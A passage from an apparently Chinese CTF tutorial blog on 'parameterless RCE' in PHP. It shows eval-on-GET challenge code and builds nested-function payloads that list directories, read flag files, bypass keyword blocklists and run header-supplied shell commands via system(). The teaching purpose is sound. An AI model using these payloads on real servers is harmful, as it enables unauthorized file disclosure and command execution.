class="number">65</span>)</span><br><span class="line">    print(res, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参数RCE</title>
      <link href="2020/12/03/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
      <url>2020/12/03/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
      
        <content type="html"><![CDATA[<p>无参数RCE：就是只使用函数，且函数不能带有参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><ul><li>语法：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="keyword">int</span> $limit = <span class="number">-1</span> [, <span class="keyword">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure><p><code>pattern</code>：要搜索的模式，可以是字符串或一个字符串数组</p><p><code>replacement</code>：用于替换的字符串或字符串数组</p><p><code>subject</code>：要搜索替换的目标字符串或字符串数组</p><p><code>limit</code>：可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）</p><p><code>count</code>：可选，为替换执行的次数</p><ul><li>简化为：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(pattern, replacement, subject)</span><br></pre></td></tr></table></figure><p>即：将<code>subject</code>中符合<code>pattern</code>的替换为<code>replacement</code></p><p>对于<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p><p>意思是，对传进来的code进行正则匹配，符合正则表达式的部分替换为空，然后返回一个新的字符串</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式（Regular Expression）描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p><p><a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式 – 语法 | 菜鸟教程 (runoob.com)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str=<span class="string">&#x27;01ABcdEf_230G&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/0/&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;    <span class="comment">//将0换成A</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">//去掉所有数字</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[a-z]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">//去掉所有小写字母</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[A-Z]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">//去掉所有大写字母</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[^A-Z]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">//去掉除了大写字母外所有的字符</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[a-z A-Z]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $str).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;<span class="comment">//去掉所有大小写字母</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>A1ABcdEf_23AG<br>ABcdEf_G<br>01ABE_230G<br>01cdf_230<br>ABEG<br>01_230<br></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;abcABC123_+-*/&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[\w]/&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $a).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[\W]/&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $a).<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&#x27;/[^\W]/&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $a).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>!!!!!!!!!!+-<em>/<br>abcABC123_!!!!<br>!!!!!!!!!!+-</em>/<br></p></blockquote><p><code>\w</code>：匹配字母、数字、下划线。等价于<code>[A-Z a-z 0-9 _]</code></p><p><code>\W</code>：匹配非字母、数字、下划线。等价于<code>[^A-Z a-z 0-9 _]</code></p><p>而<code>(?R)</code>是引用当前表达式的意思，即可以用<code>/[^\W]+\((?R)?\)/</code>替换到<code>(?R)</code>的位置</p><p><code>(?R)?</code> 这里多一个?表示可以有引用，也就是说可以衍生匹配。</p><p>即：<code>(?R)?</code>表示递归整个匹配模式</p><p>所以<code>/[^\W]+\((?R)?\)/</code>合起来就是匹配无参数的函数，函数内部可以无限嵌套相同的模式，也就是说只匹配<code>字符串+()</code>的类型，并且括号内为<code>空字符串</code>或<code>字符串+()</code>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所以对于<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p><p>像<code>fun1(fun2(fun3()))</code>最终会被替换为空</p><p>而<code>fun1(fun2(fun3(aaa)))</code>则不会进行替换，结果仍为<code>fun1(fun2(fun3(aaa)))</code></p><p><img src="https://s3.ax1x.com/2020/11/26/DBRnKg.png"></p><br><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="show-source"><a href="#show-source" class="headerlink" title="show_source()"></a>show_source()</h3><p>扩展：highlight_file() 高亮读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source()函数对文件进行语法高亮提示</span><br><span class="line">show_source(filename,return)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">filename</td><td align="left">必需。要进行高亮处理的 PHP 文件的路径。</td></tr><tr><td align="left">return</td><td align="left">可选。如果设置 true，则本函数返回高亮处理的代码。</td></tr></tbody></table><ul><li>test.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>).<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/08/17/dZ6b9J.png" alt="dZ6b9J.png"></p><h3 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h3><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组，且第一个元素为点（.)。</p><p>localeconv() 函数会返回以下数组元素：</p><ul><li>[decimal_point] - 小数点字符</li><li>[thousands_sep] - 千位分隔符</li><li>[int_curr_symbol] - 货币符号 （例如：USD）</li><li>[currency_symbol] - 货币符号 （例如：$）</li><li>[mon_decimal_point] - 货币小数点字符</li><li>[mon_thousands_sep] - 货币千位分隔符</li><li>[positive_sign] - 正值字符</li><li>[negative_sign] - 负值字符</li><li>[int_frac_digits] - 国际通用小数位</li><li>[frac_digits] - 本地通用小数位</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(localeconv());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>array(18) {<br>  [“decimal_point”]=&gt;<br>  string(1) “.”<br>  [“thousands_sep”]=&gt;<br>  string(0) “”<br>  [“int_curr_symbol”]=&gt;<br>  string(0) “”<br>  [“currency_symbol”]=&gt;<br>  string(0) “”<br>  [“mon_decimal_point”]=&gt;<br>  string(0) “”<br>  [“mon_thousands_sep”]=&gt;<br>  string(0) “”<br>  [“positive_sign”]=&gt;<br>  string(0) “”<br>  [“negative_sign”]=&gt;<br>  string(0) “”<br>  [“int_frac_digits”]=&gt;<br>  int(127)<br>  [“frac_digits”]=&gt;<br>  int(127)<br>  [“p_cs_precedes”]=&gt;<br>  int(127)<br>  [“p_sep_by_space”]=&gt;<br>  int(127)<br>  [“n_cs_precedes”]=&gt;<br>  int(127)<br>  [“n_sep_by_space”]=&gt;<br>  int(127)<br>  [“p_sign_posn”]=&gt;<br>  int(127)<br>  [“n_sign_posn”]=&gt;<br>  int(127)<br>  [“grouping”]=&gt;<br>  array(0) {<br>  }<br>  [“mon_grouping”]=&gt;<br>  array(0) {<br>  }<br>}</p></blockquote><h3 id="pos"><a href="#pos" class="headerlink" title="pos()"></a>pos()</h3><p>pos() 函数返回数组中的当前元素的值（取第一个元素）。</p><p>该函数是 <a href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> 函数的别名。</p><p>如果pos()和current()都被过滤了，可以使用reset()。</p><p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p>相关的方法：</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> - 返回数组中的当前元素的值</li><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> - 将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>scandir() 函数返回指定目录中的文件和目录的数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scandir(directory,sorting_order,context);</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>directory</em></td><td align="left">必需。规定要扫描的目录。</td></tr><tr><td align="left"><em>sorting_order</em></td><td align="left">可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。</td></tr><tr><td align="left"><em>context</em></td><td align="left">可选。规定目录句柄的环境。<em>context</em> 是可修改目录流的行为的一套选项。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;D:\ant&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/08/17/dZgcyn.png" alt="dZgcyn.png"></p><h3 id="chr"><a href="#chr" class="headerlink" title="chr()"></a>chr()</h3><p>chr() 函数从指定的 ASCII 值返回字符。</p><p>ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">61</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// 十进制</span></span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">061</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// 八进制值</span></span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">0x61</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// 十六进制值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>=<br>1<br>a<br></p></blockquote><h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h3><p><code>chdir()</code> 函数当参数为两个点的时候能够跳转到上层目录，相当于在命令行输入cd..会返回上一级目录。</p><p>DOS的Chdir（cd）命令可以显示当前目录的名称或者更改当前的目录。</p><p>一般当前显示的路径是”C:\Users\Administrator”，如果想要跳转到D盘的Test文件夹(“D:\test\”)可以直接使用DOS命令<strong>cd /d d:\test</strong></p><p>如果想要跳转到当前路径的上一级路径可以直接用DOS命令<strong>cd ..</strong></p><p>如果想要获取cd命令的具体用法，可以直接输入<strong>cd /?</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> getcwd().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">chdir(<span class="string">&quot;app&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> getcwd().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> getcwd().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>D:\phpStudy\PHPTutorial\WWW<br>D:\phpStudy\PHPTutorial\WWW\app<br>D:\phpStudy\PHPTutorial\WWW</p></blockquote><h3 id="localtime"><a href="#localtime" class="headerlink" title="localtime()"></a>localtime()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localtime(timestamp,is_assoc);</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>timestamp</em></td><td align="left">可选。规定 Unix 时间戳。如果未规定 <em>timestamp</em>，则默认为当前的本地时间 time()。</td></tr><tr><td align="left"><em>is_assoc</em></td><td align="left">可选。规定返回关联数组还是索引数组。如果为 FALSE，则返回索引数组。如果为 TRUE，则返回关联数组。默认为 FALSE。关联数组的键名如下：[tm_sec] - 秒数[tm_min] - 分钟数[tm_hour] - 小时[tm_mday] - 月份中的第几天[tm_mon] - 年份中的第几个月，从 0 开始表示一月份[tm_year] - 年份，从 1900 开始[tm_wday] - 星期中的第几天 (Sunday=0)[tm_yday] - 年中的第几天[tm_isdst] - 夏令时当前是否生效</td></tr></tbody></table><br><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/19/UfZFsK.png" alt="UfZFsK.png"></p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>可以利用<code>eval()</code>读取目录</p><ul><li>用scandir()读取目录源码，但必须带有参数（’.’），无法通过正则匹配</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/20/UflsPO.png" alt="UflsPO.png"></p><ul><li>用pos()取localeconv()返回的数组的第一个元素，也就是”.”</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(pos(localeconv())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/20/Ufloi8.png" alt="Ufloi8.png"></p><p><code>code.php?code=var_dump(scandir(pos(localeconv())));</code></p><p><img src="https://s1.ax1x.com/2020/07/20/Uflvd0.png" alt="Uflvd0.png"></p><ul><li>用end()选择最后一个文件并用readfile()读取</li></ul><p><code>code.php?code=var_dump(readfile(end(scandir(pos(localeconv())))));</code></p><blockquote><p>readfile()   输出一个文件</p><p>show_source() 与 echo(readfile())效果一样，可代替使用。</p></blockquote><p><img src="https://s1.ax1x.com/2020/07/20/Uf1kLR.png" alt="Uf1kLR.png"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>利用当前秒数构造点  ，利用localtime()中返回的秒数来构造点，点的aiisc码正好是46在60秒之内，我们只需等到46秒时候就能将点给构造出来。</p><ul><li>chr(current(localtime(time())))</li></ul><p>利用chr(46)就是字符<code>.</code></p><p>数组第一个值每秒+1，所以最多60秒就一定能得到46</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(chr(pos(localtime())));</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:8080&#x2F;code&#x2F;code.php? code&#x3D;var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>利用SESSIONID来传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>在cookie处传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID&#x3D;flag.php</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/20/Uf1UfS.png" alt="Uf1UfS.png"></p><p><img src="https://s1.ax1x.com/2020/07/20/U4hJsS.png" alt="U4hJsS.png"></p><h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h3><p>利用 getallheaders() 来获取参数RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure><p>在最后在最后一条请求头添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/08/17/dZ78KO.png" alt="dZ78KO.png"></p><br><h2 id="读取目录文件"><a href="#读取目录文件" class="headerlink" title="读取目录文件"></a>读取目录文件</h2><ul><li>如果文件是最后一个，可以用</li></ul><p><code>show_source(end(scandir(getcwd())));</code></p><blockquote><p>或者用<code>readfile()</code>、<code>highlight_file()</code>、<code>file_get_contents()</code>、<code>readgzfile()</code>等读文件函数</p></blockquote><ul><li>如果文件是倒数第二个，可以用</li></ul><p><code>show_source(next(array_reverse(scandir(getcwd()))));</code></p><blockquote><p><code>array_reverse()</code>以相反的元素顺序返回数组</p></blockquote><ul><li>如果不是数组的最后一个或者倒数第二个，可以用</li></ul><p><code>show_source(array_rand(array_flip(scandir(getcwd()))));</code></p><p>或者：</p><p><code>show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></p><blockquote><p><code>array_flip()</code>函数会交换数组的键名和键值，<code>array_rand()</code>函数会返回数组中的随机键名</p></blockquote><br><h2 id="跳转目录情况"><a href="#跳转目录情况" class="headerlink" title="跳转目录情况"></a>跳转目录情况</h2><ul><li><p>假设ﬂag在上层目录文件的情况，我们需要跳转到上层目录。 </p></li><li><p><code>chdir()</code> 函数当参数为两个点的时候能够跳转到上层目录。<code>scandir()</code> ，读取当前目录在第二个元素就能读取两个点</p></li><li><p><code>localtime</code>第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳 </p></li><li><p>构造读取上层目录payload</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure><ul><li>构造读取上层目录文件payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure><br><h2 id="其它小技巧"><a href="#其它小技巧" class="headerlink" title="其它小技巧"></a>其它小技巧</h2><ul><li>利用chr(46)就是字符<code>.</code></li></ul><p>phpversion()会返回php版本，如<code>5.6.27</code></p><p><code>floor(phpversion())</code>返回<code>5</code></p><p><code>sqrt(floor(phpversion()))</code>返回<code>2.2360679774998</code></p><p><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></p><p><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></p><p><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></p><p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></p><p>即：<code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>等于<code>.</code></p><ul><li>利用三角函数构造斜杠</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));</span><br></pre></td></tr></table></figure><ul><li>利用随机令牌构造点</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(strrev(uniqid())))));</span><br></pre></td></tr></table></figure><ul><li>查看上一级目录文件名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><br><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/i&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>首先对传进来的code进行过滤，若是通过替换后为<code>;</code>，则能通过第一个if判断语句，所以要套娃嵌套</p><p>第二个if语句对危险函数进行过滤，包括大小写，所以只能用没被过滤的函数来构造payload</p><p>eval()语句执行传进来的code，然后赋值给<code>$a</code></p><p>第三个if语句对$a进行匹配，如果含有<code>flag</code>，则die掉</p><p>绕过了前面3个if语句，则通过echo($a)，将code执行后的结果输出</p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>用<code>file_get_contents()</code>将整个文件读入一个字符串，利用eval()赋值给$a，最后通过echo()打印出来</p><p>因为不知道flag.php的位置，且过滤掉很多函数，如：end()、next()等</p><p>所以用<code>array_rand(array_flip())</code>来获取一个随机的文件名</p><p>合起来就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>但后边对$a进行正则匹配，过滤了<code>flag</code>，所以要对读取的文件内容加密，由于过滤了base64，所以选择用十六进制加密，得到最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure><p>因为是随机读取，所以要多刷新几次，然后解密看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hex2bin(<span 